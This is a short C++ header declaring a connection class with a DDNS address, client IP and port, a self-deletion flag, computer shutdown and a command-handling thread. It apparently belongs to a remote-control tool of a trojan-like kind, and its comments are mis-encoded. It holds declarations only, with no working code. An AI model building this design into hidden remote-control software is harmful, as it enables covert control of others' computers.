#pragma once
#include "SystemUtility.h"
#include "NetProtocolThread.h"
#include "DealCMDThread.h"
class CConnect
{
private:
	CString					m_strDDNSIP;			// DDNS IP��ַ
	CString					m_strClientIP;			// �ͻ���IP��ַ
	UINT					m_nClientPort;			// �ͻ��˼����˿�
	BOOL					m_bDeleteSelf;

	SOCKET					m_hSocketClient;		// ��ͻ��˽���ͨѶSOCKET
	CSystemUtility			m_systemUtility;
	HWND                    m_hwnd;
	void StopComputer(UINT uFlags);
public:
	CConnect();
	~CConnect(void);
	BOOL StartConnect(HWND hwnd);
	BOOL MakeClientConnectInfo();
	BOOL InitConnection();
	void StopConnect();

	void StartWork();

	CNetProtocolThread*		m_pNetProcotolThread;
	CDealCMDThread*			m_pDealCMDThread;
};

